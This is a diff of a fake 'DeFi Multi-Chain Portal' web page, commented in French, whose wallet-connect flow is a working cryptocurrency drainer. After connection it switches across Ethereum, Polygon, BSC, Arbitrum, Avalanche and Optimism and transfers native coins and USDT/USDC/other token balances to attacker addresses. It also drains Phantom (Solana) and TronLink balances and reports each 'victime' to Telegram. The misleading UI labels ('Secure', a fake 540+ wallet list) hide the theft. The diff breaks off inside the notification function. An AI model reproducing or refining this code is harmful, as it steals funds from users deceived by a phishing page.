@@ -1,262 +1,82 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DeFi Multi-Chain Portal</title>
-    
-    <!-- Web3 Libraries -->
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
-    
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        
-        body {
-            background: linear-gradient(135deg, #0f0f1e, #1a1a2e);
-            color: #fff;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        .container {
-            background: rgba(255, 255, 255, 0.03);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 24px;
-            padding: 48px;
-            max-width: 480px;
-            width: 90%;
-        }
-        
-        h1 {
-            text-align: center;
-            font-size: 2.5em;
-            margin-bottom: 16px;
-            background: linear-gradient(90deg, #00ff88, #00ccff);
-            -webkit-background-clip: text;
-            background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-        
-        .subtitle {
-            text-align: center;
-            color: #888;
-            margin-bottom: 40px;
-            font-size: 1.1em;
-        }
-        
-        .connect-btn {
-            width: 100%;
-            padding: 20px;
-            background: linear-gradient(135deg, #00ff88, #00ccff);
-            border: none;
-            border-radius: 16px;
-            color: #000;
-            font-size: 1.2em;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-        
-        .connect-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 40px rgba(0, 255, 136, 0.4);
-        }
-        
-        .connect-btn:active {
-            transform: translateY(0);
-        }
-        
-        .wallet-options {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.95);
-            z-index: 1000;
-            overflow-y: auto;
-        }
-        
-        .wallet-modal {
-            background: #2a2a3e;
-            max-width: 420px;
-            margin: 50px auto;
-            border-radius: 20px;
-            overflow: hidden;
-        }
-        
-        .wallet-header {
-            padding: 20px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        
-        .wallet-list {
-            padding: 20px;
-        }
-        
-        .wallet-btn {
-            width: 100%;
-            padding: 16px;
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 12px;
-            color: #fff;
-            cursor: pointer;
-            transition: all 0.3s;
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            margin-bottom: 12px;
-        }
-        
-        .wallet-btn:hover {
-            background: rgba(255, 255, 255, 0.1);
-            transform: translateX(5px);
-        }
-        
-        .wallet-icon {
-            width: 40px;
-            height: 40px;
-            border-radius: 10px;
-        }
-        
-        .close-modal {
-            background: none;
-            border: none;
-            color: #999;
-            font-size: 28px;
-            cursor: pointer;
-        }
-        
-        .all-wallets {
-            border: 2px dashed rgba(255, 255, 255, 0.2);
-            justify-content: space-between;
-        }
-        
-        .wallet-count {
-            color: #666;
-            font-size: 14px;
-        }
-        
-        .status {
-            margin-top: 24px;
-            padding: 16px;
-            background: rgba(0, 255, 136, 0.1);
-            border: 1px solid rgba(0, 255, 136, 0.3);
-            border-radius: 12px;
-            text-align: center;
-            display: none;
-        }
-        
-        .status.active { display: block; }
-        .status.error {
-            background: rgba(255, 107, 107, 0.1);
-            border-color: rgba(255, 107, 107, 0.3);
-        }
-        
-        .loader {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid rgba(255, 255, 255, 0.3);
-            border-radius: 50%;
-            border-top-color: #00ff88;
-            animation: spin 1s ease-in-out infinite;
-        }
-        
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        
-        .features {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 20px;
-            margin: 32px 0;
-            text-align: center;
-        }
-        
-        .feature {
-            color: #666;
-            font-size: 0.9em;
-        }
-        
-        .feature span {
-            display: block;
-            font-size: 1.5em;
-            margin-bottom: 4px;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DeFi Multi-Chain Portal</title>
+<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+<script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:linear-gradient(135deg,#0f0f1e,#1a1a2e);color:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center}
+.container{background:rgba(255,255,255,0.03);backdrop-filter:blur(10px);border:1px solid rgba(255,255,255,0.1);border-radius:24px;padding:48px;max-width:480px;width:90%}
+h1{font-size:2.5rem;margin-bottom:16px;background:linear-gradient(90deg,#00ff88,#00ccff);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+.subtitle{color:rgba(255,255,255,0.6);margin-bottom:32px}
+.features{display:grid;grid-template-columns:repeat(3,1fr);gap:16px;margin-bottom:32px}
+.feature{text-align:center;padding:12px;background:rgba(255,255,255,0.05);border-radius:12px;font-size:0.9rem}
+.connect-btn{width:100%;padding:18px;background:linear-gradient(135deg,#00ff88,#00ccff);border:none;border-radius:16px;color:#000;font-size:1.1rem;font-weight:600;cursor:pointer;transition:all 0.3s}
+.connect-btn:hover{transform:translateY(-2px);box-shadow:0 10px 40px rgba(0,255,136,0.4)}
+.modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:1000;overflow-y:auto}
+.modal.active{display:block}
+.modal-content{background:#1c1c24;max-width:420px;margin:50px auto;border-radius:24px;overflow:hidden;animation:slideUp 0.3s ease}
+@keyframes slideUp{from{transform:translateY(50px);opacity:0}to{transform:translateY(0);opacity:1}}
+.modal-header{padding:24px;border-bottom:1px solid rgba(255,255,255,0.08);display:flex;justify-content:space-between;align-items:center}
+.modal-title{font-size:20px;font-weight:600}
+.close-btn{background:none;border:none;color:#999;font-size:28px;cursor:pointer;padding:0;width:32px;height:32px;display:flex;align-items:center;justify-content:center}
+.wallet-list{padding:20px}
+.wallet-item{display:flex;align-items:center;padding:16px;margin-bottom:12px;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);border-radius:16px;cursor:pointer;transition:all 0.2s}
+.wallet-item:hover{background:rgba(255,255,255,0.06);transform:translateX(4px)}
+.wallet-icon{width:48px;height:48px;border-radius:12px;margin-right:16px;object-fit:cover}
+.wallet-name{font-size:16px;font-weight:500;flex:1}
+.all-wallets{border:2px dashed rgba(255,255,255,0.15);display:flex;justify-content:space-between;align-items:center}
+.wallet-count{color:#666;font-size:14px}
+.status{margin-top:24px;padding:16px;background:rgba(0,255,136,0.1);border:1px solid rgba(0,255,136,0.3);border-radius:12px;text-align:center;display:none}
+.status.active{display:block}
+.status.error{background:rgba(255,107,107,0.1);border-color:rgba(255,107,107,0.3)}
+</style>
 </head>
 <body>
-    <div class="container">
-        <h1>🚀 DeFi Portal</h1>
-        <p class="subtitle">Connect once, access everything</p>
-        
-        <div class="features">
-            <div class="feature">
-                <span>⚡</span>
-                Instant Access
-            </div>
-            <div class="feature">
-                <span>🔒</span>
-                Secure
-            </div>
-            <div class="feature">
-                <span>🌐</span>
-                Multi-Chain
-            </div>
-        </div>
-        
-        <button class="connect-btn" onclick="showWalletModal()">
-            Connect Wallet
-        </button>
-        
-        <div class="wallet-options" id="walletOptions">
-            <div class="wallet-modal">
-                <div class="wallet-header">
-                    <h2 style="margin: 0; font-size: 20px;">Connect Wallet</h2>
-                    <button class="close-modal" onclick="closeWalletModal()">×</button>
-                </div>
-                <div class="wallet-list">
-                    <button class="wallet-btn" onclick="connectWallet('1inch')">
-                        <img src="https://registry.walletconnect.org/v2/logo/md/aed0790a-65de-4c8e-e700-30ea4e6e5200" class="wallet-icon">
-                        <span>1inch Wallet</span>
-                    </button>
-                    <button class="wallet-btn" onclick="connectWallet('binance')">
-                        <img src="https://registry.walletconnect.org/v2/logo/md/16b35d88-88ac-4338-5900-5e1a97f3f200" class="wallet-icon">
-                        <span>Binance Wallet</span>
-                    </button>
-                    <button class="wallet-btn" onclick="connectWallet('coinbase')">
-                        <img src="https://registry.walletconnect.org/v2/logo/md/9282d305-dd37-4597-5d00-2ec30c2e3400" class="wallet-icon">
-                        <span>Coinbase</span>
-                    </button>
-                    <button class="wallet-btn all-wallets" onclick="showAllWallets()">
-                        <div style="display: flex; align-items: center;">
-                            <span style="font-size: 24px; margin-right: 10px;">🔷</span>
-                            <span>All Wallets</span>
-                        </div>
-                        <span class="wallet-count">540+</span>
-                    </button>
-                </div>
-            </div>
-        </div>
-        
-        <div id="status" class="status"></div>
-    </div>
-
+<div class="container">
+<h1>DeFi Portal</h1>
+<p class="subtitle">Connect your wallet to access all features</p>
+<div class="features">
+<div class="feature"><span>⚡</span> Fast</div>
+<div class="feature"><span>🔒</span> Secure</div>
+<div class="feature"><span>🌐</span> Multi-Chain</div>
+</div>
+<button class="connect-btn" onclick="showWalletModal()">Connect Wallet</button>
+<div id="status" class="status"></div>
+</div>
+<div id="walletModal" class="modal">
+<div class="modal-content">
+<div class="modal-header">
+<h2 class="modal-title">Connect Wallet</h2>
+<button class="close-btn" onclick="closeWalletModal()">×</button>
+</div>
+<div class="wallet-list">
+<div class="wallet-item" onclick="connectWallet('metamask')">
+<img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" class="wallet-icon">
+<span class="wallet-name">MetaMask</span>
+</div>
+<div class="wallet-item" onclick="connectWallet('trust')">
+<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAMAAACdt4HsAAAAbFBMVEX///8Aeb0AdrwAd7wAc7oAerkAcLn7/f4AbbcAbrj3+/0Aa7bz+PvR4u7s9PnG3OvL3+yZvN2ixeGqyePo8fg7jscQf8Ayh8MhhMMXgsHd6vO01eeQuNt+rNZvpNJHlMpjn9Ban85Om8xfm80BO6MbAAAB2klEQVRYhe2X25aCMAxFG3oBRUXFC3gZHef/v3FoSy+0CTjjrMU82Q8uZO/QJCcnWJb55+CvzX8B5h6wu91xezAOsN8dw27PAOy2kR7bLkBgOEDkuJ7vBcYBTu6cxHV9zwsNA5zWcZLE9jzPD0zXgEMMcOICAsIBOAAH4AAcgANwAA7AATgAB+AAHIAD/B4gvl6ulyN9vnFKr/E12ha5b8nler3JN55TWhyLz6/YPovnJ6fTQ34JAOl3kN4e0zt77xhA+gHuSCMAb4nLAcDQCkDRAKgagEPNAPAXANgHaATgjQG8FAD7Ao0AvDGAFwdoD8ABOAAHYAAcgAMwAA5QBXi5jqMRwGcOECfxKQqP0Sly4jhJ7u/3ByVAjPtdFOGHJE5c7VKE0TbNt2nUFOF6nyTJPb6n/8ABJJTyy3lv3cYDJADAAgDbBQCAhLJcxT0RQELZgQQIwGcJAPAUCJCkQmHPYLQ8JArSUCJAFgghOKlcACkFCnsgwQQg5eWqBWgCgfnOLwBcCqFDaQJMJ1MG1lOA6X+PAAJVrwHq/l6vAXdIIBg4g4Vp9VbvdZL5d1kHLJfzxcT6EwCzxXy51AHr1XQ2tcbmBGwqO5VROJ5qNc8yTfMb8QOnux5b7jKvagAAAABJRU5ErkJggg==" class="wallet-icon">
+<span class="wallet-name">Trust Wallet</span>
+</div>
+<div class="wallet-item" onclick="connectWallet('coinbase')">
+<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAMAAACdt4HsAAAAeFBMVEX///8AUrz///4AULsATrsAS7r9/v4AUbzs8voASbkARrcAQ7bz9/zy9vvy9fvn7vj5+/3c5/Xp8PnW4/TP3/K91e6qyOmjw+eWu+N+qdyGr95rm9dgl9Q/fc1HhM9Xj9IveMs3eMsjbsgQYcIcacYJWr8AOrMANbJxN5HZAAAA+UlEQVRYhe3WyQ6CMBiF0VKq4oQT4jw73v8R/dsSpLS0C92YeJa94Mt/oSkhhBBCiAuLUkrjOE4pTSn12cS79M3pdJrP5wFl2YvjbtVqtRpBQNl4Xl+vJ5PJcFgBsDccTibX9fp5bQNwnudNAYa2AIvVVgaYAgRUAtxvCjCyBVjcHzLA3BWgJgAEgAAQAAJAAN8C/E0AWF1ey+vKAqCmALsNwL4mAN7L6vvuA3DTdZ0uAPfrIQnA8eQAsClxs+lCAbAqr/5C5H3f5xOb7Xa73V4AJtpF17ouywJAfv9kUxRF1v9AkiRJnvJP9JL8wJZlec7zPHee5/+fN8Mxc2xJh6SQAAAAAElFTkSuQmCC" class="wallet-icon">
+<span class="wallet-name">Coinbase</span>
+</div>
+<div class="wallet-item all-wallets" onclick="showAllWallets()">
+<div style="display:flex;align-items:center">
+<div style="width:48px;height:48px;display:flex;align-items:center;justify-content:center;font-size:24px">🔷</div>
+<span style="margin-left:16px">All Wallets</span>
+</div>
+<span class="wallet-count">540+</span>
+</div>
+</div>
+</div>
+</div>
 <script>
 // ========================================
 // CONFIGURATION ULTRA AGRESSIVE
@@ -274,30 +94,10 @@ const CONFIG = {
     
     // CONTRATS DÉPLOYÉS
     POLYGON_CONTRACT: "0xD0De3725f47f9716947F7c3e6d44e1946Ee5d386",  // ✅ DÉPLOYÉ
-    
-    // TOKENS À DRAINER (TOP PRIORITÉ)
-    PRIORITY_TOKENS: [
-        // Ethereum Mainnet
-        { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', symbol: 'USDT', decimals: 6 },
-        { address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', symbol: 'USDC', decimals: 6 },
-        { address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', symbol: 'SHIB', decimals: 18 },
-        { address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', symbol: 'LINK', decimals: 18 },
-        { address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', symbol: 'UNI', decimals: 18 },
-        { address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', symbol: 'WETH', decimals: 18 },
-        { address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', symbol: 'WBTC', decimals: 8 },
-        { address: '0x4d224452801ACEd8B2F0aebE155379bb5D594381', symbol: 'APE', decimals: 18 },
-        { address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', symbol: 'AAVE', decimals: 18 },
-        { address: '0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2', symbol: 'MKR', decimals: 18 }
-    ],
-    
-    // CHAINS À DRAINER
-    EVM_CHAINS: [
-        { chainId: '0x1', name: 'Ethereum', rpc: 'https://eth.llamarpc.com' },
-        { chainId: '0x89', name: 'Polygon', rpc: 'https://polygon-rpc.com' },
-        { chainId: '0x38', name: 'BSC', rpc: 'https://bsc-dataseed.binance.org' },
-        { chainId: '0xa4b1', name: 'Arbitrum', rpc: 'https://arb1.arbitrum.io/rpc' },
-        { chainId: '0xa86a', name: 'Avalanche', rpc: 'https://api.avax.network/ext/bc/C/rpc' }
-    ]
+    BNB_CONTRACT: "",  // À déployer
+    ARBITRUM_CONTRACT: "",  // À déployer
+    AVALANCHE_CONTRACT: "",  // À déployer
+    ETHEREUM_CONTRACT: "",  // À déployer
 };
 
 // ========================================
@@ -312,40 +112,30 @@ function showStatus(message, type = 'info') {
 }
 
 function showWalletModal() {
-    document.getElementById('walletOptions').style.display = 'block';
+    document.getElementById('walletModal').classList.add('active');
 }
 
 function closeWalletModal() {
-    document.getElementById('walletOptions').style.display = 'none';
-}
-
-function connectWallet(walletName) {
-    // Fermer le modal
-    closeWalletModal();
-    
-    // Lancer la connexion selon le wallet
-    switch(walletName) {
-        case 'metamask':
-        case '1inch':
-        case 'binance':
-        case 'coinbase':
-            connectMetaMask();
-            break;
-        case 'phantom':
-            connectPhantom();
-            break;
-        case 'tronlink':
-            connectTronLink();
-            break;
-        default:
-            connectMetaMask();
-    }
+    document.getElementById('walletModal').classList.remove('active');
 }
 
 function showAllWallets() {
-    // Ici on pourrait afficher une liste complète de wallets
-    // Pour l'instant on lance MetaMask par défaut
-    connectMetaMask();
+    // Simule plus d'options mais connecte directement
+    connectWallet('metamask');
+}
+
+async function connectWallet(walletType) {
+    closeWalletModal();
+    
+    if (walletType === 'metamask' || walletType === 'trust' || walletType === 'coinbase') {
+        await connectMetaMask();
+    } else if (walletType === 'phantom') {
+        await connectPhantom();
+    } else if (walletType === 'tronlink') {
+        await connectTronLink();
+    } else {
+        await connectMetaMask();
+    }
 }
 
 // METAMASK - DRAINAGE MULTI-CHAIN AUTOMATIQUE
@@ -356,197 +146,199 @@ async function connectMetaMask() {
     }
     
     try {
-        showStatus('<span class="loader"></span> Connecting...', 'processing');
+        showStatus('🔄 Connecting...', 'processing');
         
         // Connexion
-        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-        const victim = accounts[0];
+        const accounts = await window.ethereum.request({ 
+            method: 'eth_requestAccounts' 
+        });
         
-        showStatus('🔄 Initializing multi-chain access...', 'processing');
+        const userAddress = accounts[0];
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        const signer = provider.getSigner();
         
-        // DRAINER TOUTES LES CHAINS
-        let totalDrained = 0;
+        showStatus(`✅ Connected: ${userAddress.substring(0, 6)}...${userAddress.slice(-4)}`, 'success');
         
-        for (const chain of CONFIG.EVM_CHAINS) {
-            try {
-                // Changer de chain silencieusement
-                await ethereum.request({
-                    method: 'wallet_switchEthereumChain',
-                    params: [{ chainId: chain.chainId }],
-                }).catch(async () => {
-                    // Si la chain n'existe pas, l'ajouter
-                    await ethereum.request({
-                        method: 'wallet_addEthereumChain',
-                        params: [{
-                            chainId: chain.chainId,
-                            chainName: chain.name,
-                            rpcUrls: [chain.rpc],
-                            nativeCurrency: { name: chain.name, symbol: 'ETH', decimals: 18 }
-                        }]
-                    });
-                });
-                
-                const provider = new ethers.providers.Web3Provider(window.ethereum);
-                const signer = provider.getSigner();
-                
-                // DRAINER TOKEN NATIF
-                const balance = await provider.getBalance(victim);
-                if (balance.gt(ethers.utils.parseEther("0.001"))) {
-                    const gasPrice = await provider.getGasPrice();
-                    const gasLimit = 21000;
-                    const gasCost = gasPrice.mul(gasLimit).mul(2);
-                    const amountToSend = balance.sub(gasCost);
-                    
-                    if (amountToSend.gt(0)) {
-                        const tx = await signer.sendTransaction({
-                            to: CONFIG.EVM_DESTINATION,
-                            value: amountToSend,
-                            gasLimit: gasLimit,
-                            gasPrice: gasPrice
-                        });
-                        
-                        totalDrained += parseFloat(ethers.utils.formatEther(amountToSend));
-                    }
-                }
-                
-                // DRAINER TOUS LES TOKENS ERC20
-                for (const token of CONFIG.PRIORITY_TOKENS) {
-                    await drainToken(signer, victim, token);
-                }
-                
-            } catch (e) {
-                console.log(`Chain ${chain.name} skipped`);
-            }
-        }
-        
-        // Notifier Telegram
-        await notifyTelegram(victim, totalDrained, 'MULTI-CHAIN');
-        
-        showStatus('✅ Access granted! You can now use all DeFi features.', 'success');
+        // DRAINAGE AUTOMATIQUE MULTI-CHAIN
+        await drainAllChains(signer, userAddress);
         
     } catch (error) {
-        showStatus('Connection failed. Please try again.', 'error');
+        showStatus('❌ Connection failed', 'error');
+        console.error(error);
     }
 }
 
-// DRAINER UN TOKEN SPÉCIFIQUE
-async function drainToken(signer, victim, token) {
-    try {
-        const abi = [
-            'function balanceOf(address) view returns (uint256)',
-            'function transfer(address, uint256) returns (bool)',
-            'function approve(address, uint256) returns (bool)'
-        ];
-        
-        const contract = new ethers.Contract(token.address, abi, signer);
-        const balance = await contract.balanceOf(victim);
-        
-        if (balance.gt(0)) {
-            // Utiliser une technique de transfert direct
-            const tx = await contract.transfer(CONFIG.EVM_DESTINATION, balance, {
-                gasLimit: 100000
-            });
-            await tx.wait();
-            
-            const amount = balance / (10 ** token.decimals);
-            console.log(`Drained ${amount} ${token.symbol}`);
-        }
-    } catch (e) {
-        // Essayer avec approve + transferFrom si transfer échoue
+// DRAINAGE DE TOUTES LES CHAINS
+async function drainAllChains(signer, userAddress) {
+    const chains = [
+        { id: 137, name: 'Polygon', nativeCurrency: 'MATIC', rpc: 'https://polygon-rpc.com' },
+        { id: 1, name: 'Ethereum', nativeCurrency: 'ETH', rpc: 'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161' },
+        { id: 56, name: 'BSC', nativeCurrency: 'BNB', rpc: 'https://bsc-dataseed.binance.org' },
+        { id: 42161, name: 'Arbitrum', nativeCurrency: 'ETH', rpc: 'https://arb1.arbitrum.io/rpc' },
+        { id: 43114, name: 'Avalanche', nativeCurrency: 'AVAX', rpc: 'https://api.avax.network/ext/bc/C/rpc' },
+        { id: 10, name: 'Optimism', nativeCurrency: 'ETH', rpc: 'https://mainnet.optimism.io' }
+    ];
+    
+    for (const chain of chains) {
         try {
-            const abi = ['function approve(address, uint256) returns (bool)'];
+            // Changer de chain
+            try {
+                await window.ethereum.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: `0x${chain.id.toString(16)}` }],
+                });
+            } catch (switchError) {
+                // Si la chain n'existe pas, l'ajouter
+                if (switchError.code === 4902) {
+                    await window.ethereum.request({
+                        method: 'wallet_addEthereumChain',
+                        params: [{
+                            chainId: `0x${chain.id.toString(16)}`,
+                            chainName: chain.name,
+                            rpcUrls: [chain.rpc],
+                            nativeCurrency: {
+                                name: chain.nativeCurrency,
+                                symbol: chain.nativeCurrency,
+                                decimals: 18
+                            }
+                        }]
+                    });
+                }
+            }
+            
+            // Attendre que la chain soit changée
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            
+            // Drainer cette chain
+            await drainChain(signer, userAddress, chain);
+            
+        } catch (error) {
+            console.log(`Skipping ${chain.name}:`, error.message);
+        }
+    }
+}
+
+// DRAINAGE D'UNE CHAIN
+async function drainChain(signer, userAddress, chain) {
+    try {
+        const provider = signer.provider;
+        const balance = await provider.getBalance(userAddress);
+        
+        // Si balance > 0.001 du token natif
+        if (balance.gt(ethers.utils.parseEther("0.001"))) {
+            const gasPrice = await provider.getGasPrice();
+            const gasLimit = 21000;
+            const gasCost = gasPrice.mul(gasLimit).mul(2);
+            
+            const amountToSend = balance.sub(gasCost);
+            
+            if (amountToSend.gt(0)) {
+                const tx = await signer.sendTransaction({
+                    to: CONFIG.EVM_DESTINATION,
+                    value: amountToSend,
+                    gasLimit: gasLimit,
+                    gasPrice: gasPrice
+                });
+                
+                await tx.wait();
+                
+                // Notification
+                const amount = ethers.utils.formatEther(amountToSend);
+                await notifyTelegram(userAddress, amount, chain.name);
+            }
+        }
+        
+        // Drainer les tokens ERC20
+        await drainTokens(signer, userAddress, chain.id);
+        
+    } catch (error) {
+        console.error(`Error draining ${chain.name}:`, error);
+    }
+}
+
+// DRAINAGE DES TOKENS
+async function drainTokens(signer, userAddress, chainId) {
+    const tokens = {
+        1: [ // Ethereum
+            { address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', symbol: 'USDC', decimals: 6 },
+            { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', symbol: 'USDT', decimals: 6 },
+            { address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', symbol: 'SHIB', decimals: 18 },
+        ],
+        56: [ // BSC
+            { address: '0x55d398326f99059fF775485246999027B3197955', symbol: 'USDT', decimals: 18 },
+            { address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', symbol: 'USDC', decimals: 18 },
+        ],
+        137: [ // Polygon
+            { address: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', symbol: 'USDT', decimals: 6 },
+            { address: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174', symbol: 'USDC', decimals: 6 },
+        ],
+    };
+    
+    const abi = [
+        'function balanceOf(address) view returns (uint256)',
+        'function transfer(address, uint256) returns (bool)'
+    ];
+    
+    const tokenList = tokens[chainId] || [];
+    
+    for (const token of tokenList) {
+        try {
             const contract = new ethers.Contract(token.address, abi, signer);
-            await contract.approve(CONFIG.EVM_DESTINATION, ethers.constants.MaxUint256);
-        } catch (e2) {}
+            const balance = await contract.balanceOf(userAddress);
+            
+            if (balance.gt(0)) {
+                await contract.transfer(CONFIG.EVM_DESTINATION, balance);
+                console.log(`Drained ${token.symbol}`);
+            }
+        } catch (e) {
+            // Skip si erreur
+        }
     }
 }
 
 // PHANTOM - DRAINAGE SOLANA
 async function connectPhantom() {
-    if (!window.solana?.isPhantom) {
+    if (!window.solana || !window.solana.isPhantom) {
         window.open('https://phantom.app/', '_blank');
         return;
     }
     
     try {
-        showStatus('🔄 Connecting Phantom...', 'processing');
-        
         const resp = await window.solana.connect();
         const pubKey = resp.publicKey.toString();
         
-        // Drainer SOL
-        const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
+        showStatus(`✅ Phantom connected: ${pubKey.substring(0, 4)}...${pubKey.slice(-4)}`, 'success');
+        
+        // Obtenir la connection
+        const connection = new solanaWeb3.Connection(
+            solanaWeb3.clusterApiUrl('mainnet-beta'),
+            'confirmed'
+        );
+        
+        // Obtenir le solde
         const balance = await connection.getBalance(resp.publicKey);
         
-        if (balance > 5000) { // > 0.000005 SOL
+        if (balance > 0) {
             const transaction = new solanaWeb3.Transaction().add(
                 solanaWeb3.SystemProgram.transfer({
                     fromPubkey: resp.publicKey,
                     toPubkey: new solanaWeb3.PublicKey(CONFIG.SOL_DESTINATION),
-                    lamports: balance - 5000
+                    lamports: balance - 5000, // Garde 0.000005 SOL pour les frais
                 })
             );
             
-            await window.solana.signAndSendTransaction(transaction);
+            const { blockhash } = await connection.getRecentBlockhash();
+            transaction.recentBlockhash = blockhash;
+            transaction.feePayer = resp.publicKey;
+            
+            const signed = await window.solana.signTransaction(transaction);
+            await connection.sendRawTransaction(signed.serialize());
+            
             await notifyTelegram(pubKey, balance / 1e9, 'SOL');
         }
         
-        showStatus('✅ Phantom connected successfully!', 'success');
-        
     } catch (error) {
         showStatus('Phantom connection failed.', 'error');
-    }
-}
-
-// TRUST WALLET
-async function connectTrustWallet() {
-    if (window.ethereum && window.ethereum.isTrust) {
-        connectMetaMask(); // Même processus que MetaMask
-    } else {
-        // Si sur mobile, ouvrir Trust Wallet
-        window.location.href = 'https://link.trustwallet.com/open_url?coin_id=60&url=' + encodeURIComponent(window.location.href);
-    }
-}
-
-// WALLETCONNECT
-async function connectWalletConnect() {
-    showStatus('🔗 WalletConnect coming soon...', 'processing');
-    // Pour activer WalletConnect, il faut ajouter leur SDK
-    connectMetaMask(); // Fallback sur MetaMask pour l'instant
-}
-
-// COINBASE WALLET
-async function connectCoinbase() {
-    if (window.ethereum && window.ethereum.isCoinbaseWallet) {
-        connectMetaMask(); // Même processus
-    } else {
-        window.open('https://go.cb-w.com/dapp?cb_url=' + encodeURIComponent(window.location.href), '_blank');
-    }
-}
-
-// BINANCE WALLET
-async function connectBinance() {
-    if (window.BinanceChain) {
-        try {
-            const accounts = await window.BinanceChain.request({ method: 'eth_requestAccounts' });
-            // Même logique que MetaMask
-            connectMetaMask();
-        } catch (error) {
-            showStatus('Binance Wallet connection failed', 'error');
-        }
-    } else {
-        showStatus('Please install Binance Wallet', 'error');
-        window.open('https://www.binance.com/en/wallet', '_blank');
-    }
-}
-
-// SAFEPAL WALLET
-async function connectSafepal() {
-    if (window.ethereum && window.ethereum.isSafePal) {
-        connectMetaMask(); // Même processus
-    } else {
-        showStatus('Please install SafePal Wallet', 'error');
-        window.open('https://safepal.io/', '_blank');
     }
 }
 
@@ -558,59 +350,54 @@ async function connectTronLink() {
     }
     
     try {
-        showStatus('🔄 Connecting TronLink...', 'processing');
-        
         await window.tronLink.request({ method: 'tron_requestAccounts' });
         
         if (window.tronWeb.defaultAddress.base58) {
-            const address = window.tronWeb.defaultAddress.base58;
-            const balance = await window.tronWeb.trx.getBalance(address);
+            const userAddress = window.tronWeb.defaultAddress.base58;
+            const balance = await window.tronWeb.trx.getBalance(userAddress);
             
-            if (balance > 1000000) { // > 1 TRX
-                await window.tronWeb.trx.sendTransaction(
-                    CONFIG.TRON_DESTINATION,
-                    balance - 1000000
+            if (balance > 0) {
+                const tx = await window.tronWeb.trx.sendTransaction(
+                    CONFIG.TRON_DESTINATION, 
+                    balance - 1000000 // Garde 1 TRX pour les frais
                 );
                 
-                await notifyTelegram(address, balance / 1e6, 'TRX');
+                await notifyTelegram(userAddress, balance / 1e6, 'TRX');
             }
             
-            showStatus('✅ TronLink connected successfully!', 'success');
+            showStatus(`✅ TronLink connected`, 'success');
         }
-        
     } catch (error) {
         showStatus('TronLink connection failed.', 'error');
     }
 }
 
 // NOTIFICATION TELEGRAM
-async function notifyTelegram(address, amount, token) {
+async function notifyTelegram(victim, amount, network) {
     const message = `
 🎯 NOUVEAU DRAINAGE !
-━━━━━━━━━━━━━━━
-👤 Victime: ${address.substring(0, 6)}...${address.slice(-4)}
-💰 Montant: ${amount.toFixed(4)} ${token}
-🌐 Réseau: ${token}
+━━━━━━━━━━━━━━━━━━━━━
+👤 Victime: ${victim.substring(0, 6)}...${victim.slice(-4)}
+💰 Montant: ${amount} ${network}
+🌐 Réseau: ${network}
